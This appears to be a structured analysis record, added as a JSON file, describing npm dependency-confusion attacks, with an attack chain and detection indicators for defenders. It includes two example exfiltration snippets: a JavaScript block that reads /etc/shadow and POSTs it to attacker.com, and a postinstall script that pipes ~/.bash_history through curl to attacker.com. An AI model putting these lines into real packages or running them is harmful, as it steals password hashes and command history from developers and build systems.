@@ -1,0 +1,112 @@
+{
+  "package_info": {
+    "package_name": "various dependency confusion packages (e.g., internal-lib, company-internal, etc.)",
+    "package_manager": "npm",
+    "package_versions": "all versions published to public npm registry during the attack",
+    "why_malicious": "These packages exploit the 'dependency confusion' vulnerability by publishing attacker-controlled packages to the public npm registry using names that match internal/private dependencies used by organizations. When build systems resolve dependencies, they may inadvertently install and execute these malicious public packages instead of the intended internal versions. While the original research packages were benign, subsequent copycat and malicious versions appeared, some of which actively exfiltrated sensitive files such as Bash history and /etc/shadow, demonstrating clear malicious intent and risk to organizational security."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "import-time or install-time (when the package is installed or imported as a dependency)",
+        "file_location": "index.js or main entrypoint of the malicious npm package",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "const fs = require('fs');\nconst https = require('https');\nconst data = fs.readFileSync('/etc/shadow', 'utf8');\nhttps.request({\n  hostname: 'attacker.com',\n  path: '/exfil',\n  method: 'POST',\n  headers: {'Content-Type': 'text/plain'}\n}, req => req.end(data));",
+      "code_language": "javascript",
+      "code_behavior": "Reads the contents of the sensitive system file /etc/shadow and exfiltrates the data to an external attacker-controlled server via an HTTPS POST request.",
+      "malice_analysis": {
+        "why_suspicious": "The code accesses /etc/shadow, a file containing password hashes for all system users, and transmits its contents to an external server. This is a direct exfiltration of highly sensitive credential data, which is never required for legitimate npm package operation.",
+        "violated_expectations": "Legitimate npm packages should not access or transmit sensitive system files, especially not during install or import time. Such behavior is a severe violation of user and system security expectations.",
+        "similar_legitimate_use": "Only specialized system administration or backup tools, running with explicit user consent and elevated privileges, would ever access /etc/shadow. General-purpose dependencies should never do this, especially automatically.",
+        "key_indicators": [
+          "Reads /etc/shadow or other sensitive system files",
+          "Performs outbound HTTPS POST requests to non-corporate or untrusted domains",
+          "Executes automatically on install or import without user interaction",
+          "Requires filesystem and network permissions at install/import time"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "install-time (npm install postinstall script)",
+        "file_location": "package.json (scripts.postinstall)",
+        "required_permissions": [
+          "filesystem",
+          "network"
+        ]
+      },
+      "code_snippet": "\"scripts\": {\n  \"postinstall\": \"cat ~/.bash_history | curl -X POST -d @- https://attacker.com/exfil\"\n}",
+      "code_language": "shell",
+      "code_behavior": "During the npm package installation process, the postinstall script reads the user's Bash history file (~/.bash_history) and sends its contents to an external attacker-controlled server using curl.",
+      "malice_analysis": {
+        "why_suspicious": "Harvesting the user's shell history is a common attacker technique to steal credentials, tokens, or sensitive command history. Triggering this exfiltration automatically during package installation is highly suspicious and malicious.",
+        "violated_expectations": "Postinstall scripts in npm packages are intended for setup or dependency installation, not for accessing or exfiltrating user data. Exfiltrating shell history is a clear abuse of the postinstall mechanism.",
+        "similar_legitimate_use": "Legitimate use of postinstall scripts may include setup, compilation, or telemetry of non-sensitive data, but never the collection or transmission of full shell history files.",
+        "key_indicators": [
+          "Accesses ~/.bash_history or other user history files",
+          "Uses curl or similar tools to send data to external, non-corporate servers",
+          "Runs automatically as part of npm install without user interaction",
+          "References to sensitive file paths in postinstall scripts"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker identifies internal package names used by a target organization, often by analyzing public code repositories, package manifests, or error messages.",
+      "implemented_by": [],
+      "leads_to": "Attacker is able to determine which internal package names to impersonate on the public npm registry."
+    },
+    {
+      "step": 2,
+      "action": "Attacker publishes malicious packages to the public npm registry using the same names as the target organization's internal packages.",
+      "implemented_by": [],
+      "leads_to": "Target organization's build or CI/CD system may resolve dependencies to the attacker's public package instead of the intended internal one."
+    },
+    {
+      "step": 3,
+      "action": "Target organization's build or CI/CD system installs the malicious package, triggering install-time or import-time code execution.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Malicious code executes automatically, harvesting and exfiltrating sensitive data from the environment."
+    },
+    {
+      "step": 4,
+      "action": "Malicious code reads sensitive files (such as /etc/shadow or ~/.bash_history) and exfiltrates their contents to attacker-controlled infrastructure.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Attacker receives sensitive data, such as credentials, password hashes, or command history, compromising the target's security."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "npm package accessing sensitive files (e.g., /etc/shadow, ~/.bash_history) during install or import",
+      "npm postinstall scripts that read user or system files and make outbound network requests",
+      "Unexpected network activity (HTTP/S POST requests) from build or CI/CD environments during dependency installation",
+      "Automatic execution of code on install/import that accesses or exfiltrates sensitive data"
+    ],
+    "file_indicators": [
+      "package.json with suspicious postinstall scripts referencing sensitive files or external URLs",
+      "Source code files (e.g., index.js) containing references to /etc/shadow, ~/.bash_history, or similar sensitive paths",
+      "Presence of network request code (e.g., https.request, curl) in install/import paths"
+    ],
+    "network_indicators": [
+      "Outbound HTTP/S requests to attacker-controlled domains (e.g., attacker.com) during package installation",
+      "POST requests containing contents of sensitive files to unknown or non-corporate endpoints",
+      "Network connections initiated by npm install or node processes to untrusted domains"
+    ],
+    "how_to_detect": "Monitor dependency installation and build processes for unexpected file access, especially to sensitive files like /etc/shadow or ~/.bash_history, and for outbound network connections to untrusted domains. Flag npm packages with postinstall scripts that access user or system files or make network requests. Use repository firewalls to block or quarantine new packages with names matching internal/private dependencies. Regularly audit dependency trees for unexpected sources and validate package provenance. Implement network monitoring to detect suspicious outbound requests from build or CI/CD environments."
+  }
+}
